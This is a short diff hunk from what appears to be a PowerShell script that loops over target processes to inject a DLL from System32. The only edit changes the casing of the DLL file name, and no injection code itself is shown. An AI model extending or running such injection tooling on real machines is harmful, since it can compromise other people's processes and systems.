@@ -76,7 +76,7 @@ $targetProcesses = @(
 )
 
 
-$dllPath = "C:\Windows\System32\Apon.dll"
+$dllPath = "C:\Windows\System32\APon.dll"
 $alreadyInjected = @{}
 
 while ($true) {
